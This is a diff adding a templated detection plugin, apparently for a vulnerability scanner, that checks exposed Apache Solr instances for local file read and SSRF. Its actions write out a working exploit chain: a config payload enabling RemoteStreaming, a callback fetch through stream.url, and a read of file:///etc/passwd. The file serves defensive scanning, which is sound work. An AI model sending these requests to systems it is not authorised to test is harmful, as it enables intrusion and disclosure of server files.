@@ -1,0 +1,187 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "ApacheSolr_LFR_SSRF_ExposedUI"
+  author: 
+    "Robert Dick (robert@doyensec.com) for the Templated version, "
+    "C4o (syttcasd@gmail.com) for the original Java version"
+  version: "2.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "ApacheSolr_LFR_SSRF_ExposedUI"
+  }
+  severity: HIGH
+  title: "Apache Solr Exposed UI Local File Read and SSRF"
+  description: 
+    "When Apache Solr service is exposed to untrusted networks and authentication is not enabled,"
+    " the exposed APIs allow attackers to enable Solr's `RemoteStreaming` service and use"
+    " this service to perform Server Side Request Forgery (SSRF) and/or Local File"
+    " Inclusion (LFI) attacks on the system. This is usually done using the following"
+    " steps:\n\n"
+    "  1. Enumerating available Solr database names by sending a request to"
+    " http://[solr_service]/solr/admin/cores?indexInfo=false&wt=json\n"
+    "  2. Enabling `RemoteStreaming` service for a given database by sending a request to"
+    " http://[solr_service]/solr/[database]/config with the following json payload"
+    " `{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}`\n"
+    "  3. Reading arbitrary URL through `stream.url` parameter by sending a request to"
+    " http://[solr_service]/solr/[database]/debug/dump?param=ContentStreams&stream.url=[url].\n\n"
+    "See extra details for the exact scanning traffic sent by the scanner and use them to"
+    " reproduce this vulnerability.\n\n"
+    "Note that in 8.11.3 and later, the option is no longer configurable by API. See "
+    "https://solr.apache.org/docs/8_11_3/changes/Changes.html#v8.11.3.other_changes for more "
+    "information."
+  recommendation: 
+    "Apache Solr is acknowledged by its developers to be insecure and should never be exposed on"
+    " the Internet per https://cwiki.apache.org/confluence/display/SOLR/SolrSecurity and"
+    " https://solr.apache.org/guide/8_11/securing-solr.html. It is highly recommended that"
+    " the Apache Solr service is bound to localhost whenever possible and you **DO NOT**"
+    " use Apache Solr for handling Confidential or Need-to-Know data."
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_solr"
+  http_request: {
+    method: GET
+    uri: "/solr/admin/info/system?wt=json"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "solr-spec-version" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "get_solr_core"
+  http_request: {
+    method: GET
+    uri: "/solr/admin/cores?wt=json&indexInfo=false&_={{ T_UTL_CURRENT_TIMESTAMP_MS }}"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "\"status\":" }
+        ]
+      }
+      extract_all: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: "\"status\":\\s*\\{\\s*\"([^\"]+)\""
+            variable_name: "core"
+          }
+        ]
+      }
+    }
+  }
+}
+
+# no checks on the status code here because it can't be updated via API in later versions of solr
+# but would still be vulnerable if already configured with it enabled
+
+actions: {
+  name: "enable_remote_streaming"
+  http_request: {
+    method: POST
+    uri: "/solr/{{ core }}/config"
+    data: "{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}"
+  }
+  cleanup_actions: ["disable_remote_streaming"]
+}
+
+actions: {
+  name: "disable_remote_streaming"
+  http_request: {
+    method: POST
+    uri: "/solr/{{ core }}/config"
+    data: "{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":false}}"
+  }
+}
+
+# out of band
+# http://[solr_service]/solr/[core]/debug/dump?param=ContentStreams&stream.url=[url]
+
+actions: {
+  name: "stream_callback_url"
+  http_request: {
+    method: GET
+    uri: "/solr/{{ core }}/debug/dump?param=ContentStreams&stream.url={{ T_CBS_URI }}"
+  }
+}
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 3000 } }
+}
+
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+# reflective
+# http://[solr_service]/solr/[core]/debug/dump?param=ContentStreams&stream.url=file://[file_on_solr]
+
+actions: {
+  name: "stream_local_file"
+  http_request: {
+    method: GET
+    uri: "/solr/{{ core }}/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd"
+    response: {
+      http_status: 200
+      expect_any: {
+        conditions: [
+          { body: {} contains: "root:x:0:0" },
+          { body: {} contains: "root:*:0:0" }
+        ]
+      }
+    }
+  }
+}
+
+
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  actions: [
+    "fingerprint_solr",
+    "get_solr_core",
+    "enable_remote_streaming",
+    "stream_callback_url",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
+
+workflows: {
+  actions: [
+    "fingerprint_solr",
+    "get_solr_core",
+    "enable_remote_streaming",
+    "stream_local_file"
+  ]
+}
+
+
